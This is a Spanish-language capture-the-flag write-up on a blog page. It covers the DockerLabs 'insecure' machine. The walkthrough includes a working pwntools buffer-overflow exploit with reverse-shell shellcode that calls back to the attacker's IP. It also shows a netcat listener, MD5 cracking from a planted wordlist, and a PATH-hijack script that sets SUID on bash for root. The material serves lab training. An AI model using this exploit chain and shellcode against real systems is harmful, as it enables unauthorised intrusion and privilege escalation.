@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | insecure</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 16 16" height="1.2em" width="1.2em" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">insecure</h2>
+          <small class="date">12 Sep 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">dockerlabs</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">dificil</a>
+            
+          </div>
+        </div>
+        <div class="content">
+<p><img src="/assets/images/insecure/0.jpg" alt="image"></p>
+
+<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+
+<p>Utilizamos <strong>Rustscan</strong> para identificar rápidamente los puertos abiertos en la IP objetivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 172.17.0.2 <span class="nt">-b</span> 10
+Open 172.17.0.2:80
+Open 172.17.0.2:20201
+</code></pre></div></div>
+
+<p>Ahora usamos <strong>Nmap</strong> para obtener más información sobre los servicios que corren en los puertos identificados:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,20201 <span class="nt">-v</span> 172.17.0.2
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: software installation
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.62 <span class="o">(</span>Debian<span class="o">)</span>
+20201/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     Enter data: Data received correctly
+|   NULL: 
+|_    Enter data:
+</code></pre></div></div>
+
+<p>Obtenemos el siguiente resultado:</p>
+
+<ul>
+  <li>Puerto 80: Corriendo Apache HTTPD 2.4.62 (Debian). El sitio muestra un título de “software installation”.</li>
+  <li>Puerto 20201: Servicio desconocido que acepta entradas con el mensaje “Enter data: Data received correctly”.</li>
+</ul>
+
+<h3 id="enumeración-web">Enumeración web</h3>
+
+<p>Exploramos la web con <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-vvvv</span> http://172.17.0.2
+...
+ &lt;a <span class="nv">style</span><span class="o">=</span><span class="s2">"display: block; width: 100px; margin: 0 auto;"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"./secure_software"</span><span class="o">&gt;</span>download&lt;/a&gt;
+....
+</code></pre></div></div>
+
+<p>Vemos que hay un enlace para descargar un posible “software”. Lo descargamos y le damos permisos de ejecución:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/secure_software <span class="nt">-O</span>
+
+<span class="nv">$ </span><span class="nb">chmod</span> +x secure_software
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Ahora que tenemos el fichero en nuestro equipo vamos a intentar ganar acceso a través del binario. Empezamos abriendo el binario con gdb:</p>
+
+<p><img src="/assets/images/insecure/1.png" alt="image"></p>
+
+<p>Una vez dentro vamos a crear un patrón por si hubiera un Stack Buffer Overflow. Usamos el comando <code class="language-plaintext highlighter-rouge">pattern create 400</code> :</p>
+
+<p><img src="/assets/images/insecure/2.png" alt="image"></p>
+
+<p>Ejecutamos el binario dentro de gdb con <code class="language-plaintext highlighter-rouge">run</code>:</p>
+
+<p><img src="/assets/images/insecure/3.png" alt="image"></p>
+
+<p>En otra consola nos conectamos al binario mediante <strong>telnet</strong> con <code class="language-plaintext highlighter-rouge">telnet localhost 20201</code> y mandamos el patrón que hemos generado anteriormente.</p>
+
+<p>Volvemos a la consola donde se está ejecutando <strong>gdb</strong> y vemos que la aplicación se ha terminado con <strong>SIGSEV.</strong></p>
+
+<p><img src="/assets/images/insecure/4.png" alt="image"></p>
+
+<p>Ahora tenemos que buscar el offset, el numero de bytes a partir del cual el programa falla. Para ello usamos el comando <code class="language-plaintext highlighter-rouge">pattern offset</code> junto con la dirección de memoria que nos indica:</p>
+
+<p><img src="/assets/images/insecure/5.png" alt="image"></p>
+
+<p>Ahora que ya sabemos el offset vamos a crearnos un script en python usando la librería  <strong>pwntools</strong> de Python. En este primer script vamos a intentar ver si llena el registro <strong>$eip</strong> con la letra B (“\x42”). Para ello creamos un payload con 300 caracteres A más 4 B’s.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
+
+from pwn import <span class="k">*</span>
+
+log.warning<span class="o">(</span>f<span class="s1">'Usage: python3 {sys.argv[0]} [ip:port]'</span><span class="o">)</span>
+context.binary <span class="o">=</span> <span class="s1">'secure_software'</span>
+
+payload <span class="o">=</span> <span class="s2">"A"</span><span class="k">*</span>300 + <span class="s2">"B"</span><span class="k">*</span>4
+
+<span class="k">if </span>len<span class="o">(</span>sys.argv<span class="o">)</span> <span class="o">&gt;</span> 1:
+    ip, port <span class="o">=</span> sys.argv[1].split<span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
+    p <span class="o">=</span> remote<span class="o">(</span>ip, port<span class="o">)</span>
+<span class="k">else</span>:
+    p <span class="o">=</span> process<span class="o">(</span>context.binary.path<span class="o">)</span>
+
+p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
+p.interactive<span class="o">()</span>
+</code></pre></div></div>
+
+<p>Volvemos a ejecutar el binario en <strong>gdb</strong> y cuando este listo escuchando ejecutamos el script para que se conecte a nuestra máquina desde otra consola:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 exploit.py 172.17.0.1:20201
+<span class="o">[!]</span> Usage: python3 exploit.py <span class="o">[</span>ip:port]
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/mur/machines/dockerlabs/insecure/secure_software'</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+<span class="o">[</span>←] Opening connection to 172.17.0.1 on port 20201: Trying 172.[+] Opening connection to 172.17.0.1 on port 20201: Done
+/home/mur/machines/dockerlabs/insecure/exploit.py:16: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que el script se ha ejecutado correctamente. Ahora nos movemos a <strong>gdb</strong> y ejecutamos <code class="language-plaintext highlighter-rouge">register</code> para ver que hay en los registros:</p>
+
+<p><img src="/assets/images/insecure/6.png" alt="image"></p>
+
+<p>Como vemos se ha sobrescrito el registro <strong>$eip</strong> con el caracter B(\x42)</p>
+
+<p>El siguiente paso es ver como desborda la pila para poder mandar nuestro shellcode y lo ejecute. Le añadimos 100 C’s al final del payload y lo volvemos a ejecutar (hay que reiniciar el binario en gdb)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
+
+from pwn import <span class="k">*</span>
+
+log.warning<span class="o">(</span>f<span class="s1">'Usage: python3 {sys.argv[0]} [ip:port]'</span><span class="o">)</span>
+context.binary <span class="o">=</span> <span class="s1">'secure_software'</span>
+
+payload <span class="o">=</span> <span class="s2">"A"</span><span class="k">*</span>300 + <span class="s2">"B"</span><span class="k">*</span>4 + <span class="s2">"C"</span><span class="k">*</span>100 
+
+<span class="k">if </span>len<span class="o">(</span>sys.argv<span class="o">)</span> <span class="o">&gt;</span> 1:
+    ip, port <span class="o">=</span> sys.argv[1].split<span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
+    p <span class="o">=</span> remote<span class="o">(</span>ip, port<span class="o">)</span>
+<span class="k">else</span>:
+    p <span class="o">=</span> process<span class="o">(</span>context.binary.path<span class="o">)</span>
+
+p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
+p.interactive<span class="o">()</span>
+</code></pre></div></div>
+
+<p>En <strong>gdb</strong> vamos a ver los siguientes 30bytes después del registro <strong>$esp.</strong> Para ello ejecutamos <code class="language-plaintext highlighter-rouge">x/30x $esp</code>:</p>
+
+<p><img src="/assets/images/insecure/7.png" alt="image"></p>
+
+<p>Para terminar vamos a meter un shellcode que nos de una reverse shell. Usaremos el siguente shellcode <a href="https://www.exploit-db.com/shellcodes/50125">https://www.exploit-db.com/shellcodes/50125</a> . Como vemos en las notas habría que modificar los bytes para incorporar nuestra dirección IP a partir del byte 26.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+ /<span class="k">*</span> Default IP and port at 26th and 32nd byte index: <span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>01 <span class="se">\x</span>11<span class="se">\x</span>5c <span class="k">*</span>/
+</code></pre></div></div>
+
+<p>Para convertir nuestra IP a bytes usaremos <code class="language-plaintext highlighter-rouge">python3 -c "import socket; print(socket.inet_aton('172.17.0.1'))"</code> que nos devolverá <strong>b’\xac\x11\x00\x01’ .</strong> La shellcode quedaria asi:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+</code></pre></div></div>
+
+<p>Modificamos el script para poder incorporar la shellcode:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
+
+from pwn import <span class="k">*</span>
+
+log.warning<span class="o">(</span>f<span class="s1">'Usage: python3 {sys.argv[0]} [ip:port]'</span><span class="o">)</span>
+context.binary <span class="o">=</span> <span class="s1">'secure_software'</span>
+
+rop <span class="o">=</span> ROP<span class="o">(</span>context.binary<span class="o">)</span>
+eip <span class="o">=</span> p32<span class="o">(</span>rop.jmp_esp.address<span class="o">)</span>
+
+reverse <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+payload <span class="o">=</span> b<span class="s2">"A"</span><span class="k">*</span>300
+payload +<span class="o">=</span> eip
+payload +<span class="o">=</span> reverse
+
+<span class="k">if </span>len<span class="o">(</span>sys.argv<span class="o">)</span> <span class="o">&gt;</span> 1:
+    ip, port <span class="o">=</span> sys.argv[1].split<span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
+    p <span class="o">=</span> remote<span class="o">(</span>ip, port<span class="o">)</span>
+<span class="k">else</span>:
+    p <span class="o">=</span> process<span class="o">(</span>context.binary.path<span class="o">)</span>
+
+p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
+p.interactive<span class="o">()</span>
+</code></pre></div></div>
+
+<p>Lo probamos en local primero y cuando vemos que funciona lo ejecutamos contra la máquina victima. Nos ponemos a la escucha en nuestra máquina en el puerto 4444, como esta en la shellcode.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444
+Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+</code></pre></div></div>
+
+<p>Y ejecutamos el script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 exploit.py 172.17.0.2:20201
+</code></pre></div></div>
+
+<p>Obtenemos la shell y hacemos el tratamiento de la tty:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:34020.
+<span class="nb">whoami
+</span>securedev
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<h3 id="movimiento-lateral">Movimiento lateral</h3>
+
+<p>Una vez dentro de la máquina vamos a enumerar primero el Home del usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/home/securedev<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 20
+<span class="nt">-rw-r--r--</span> 1 securedev securedev    68 Sep  6 14:05 hashfile
+<span class="nt">-rwxr-xr-x</span> 1 securedev securedev 15264 Sep  6 14:36 secure_software
+</code></pre></div></div>
+
+<p>Encontramos un hash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/home/securedev<span class="nv">$ </span><span class="nb">cat </span>hashfile 
+This is <span class="k">for </span>you, john the ripper:
+
+21571b31a8d2e8b03690989835872cc6
+</code></pre></div></div>
+
+<p>No tenemos suerte con el rockyou, asi que seguimos buscando por la máquina. Vamos a ver que usuarios hay en el sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/home/securedev<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
+root:x:0:0:root:/root:/bin/bash
+securedev:x:1000:1000::/home/securedev:/bin/bash
+johntheripper:x:1001:1001::/home/johntheripper:/bin/bash
+</code></pre></div></div>
+
+<p>Ahora buscamos ficheros del user <strong>johntheripper:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/<span class="nv">$ </span>find / <span class="nt">-user</span> johntheripper <span class="nt">-type</span> f 2&gt;/dev/null
+/opt/.hidden/words
+</code></pre></div></div>
+
+<p>Vemos el contenido del fichero encontrado:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/<span class="nv">$ </span><span class="nb">cat</span> /opt/.hidden/words
+I love these words:
+
+test123test333
+333300trest
+trest00aa20_
+_23t_32_g4
+testnefg321ttt
+trestre2612t33s
+11tv1e0st!!!!!
+<span class="o">!!</span>10t3bst??
+tset0tevst!
+ts!tse?test01
+_0test!X!test0
+0143_t3s5t53_0
+</code></pre></div></div>
+
+<p>Nos llevamos a nuestra máquina los ficheros e intentamos sacar la pass con <strong>hashcat</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 0 <span class="nb">hash </span>words.txt
+21571b31a8d2e8b03690989835872cc6:tset0tevst!
+</code></pre></div></div>
+
+<p>Nos cambiamos de usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/<span class="nv">$ </span>su johntheripper
+Password: 
+johntheripper@6a2ba51ee826:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Hacemos los mismo que con el usuario securedev, listamos el directorio Home y nos encontramos un nuevo binario con permisos SUID de root. Nos lo mandamos a nuestro equipo.</p>
+
+<h3 id="escalada-a-root">Escalada a root</h3>
+
+<p>Lo abrimos con <strong>gdb</strong> y hacemos <strong>disas main</strong> para ver el código en ensamblador:</p>
+
+<p><img src="/assets/images/insecure/8.png" alt="image"></p>
+
+<p>Podemos ver que hace una llamada a una función <strong>system</strong>.</p>
+
+<p>Ahora abrimos con <strong>ida Free</strong> el binario y vemos que la llamada <strong>system</strong> es ejecutar <strong>ls</strong>.</p>
+
+<p><img src="/assets/images/insecure/9.png" alt="image"></p>
+
+<p>Vamos a modificar el path para añadir el directorio home del usuario. Ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>johntheripper@6a2ba51ee826:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/johntheripper/:<span class="nv">$PATH</span>
+<span class="nv">PATH</span><span class="o">=</span>/home/johntheripper/:johntheripper@6a2ba51ee826:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/home/johntheripper/:/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
+</code></pre></div></div>
+
+<p>Creamos en el directorio home del usuario <strong>johntheripper</strong> un archivo llamado <strong>ls</strong> que ejecute lo siguiente y después le damos permisos de ejecución:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">chmod</span> +s /usr/bin/bash
+</code></pre></div></div>
+
+<p>Ahora ejecutamos el binario <strong>show_files</strong> y después ejecutamos bash -p para obtener la shell de root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>johntheripper@6a2ba51ee826:~<span class="nv">$ </span>./show_files 
+johntheripper@6a2ba51ee826:~<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.2# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+</div>
+      </section>
+      <footer>
+  <p>© 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
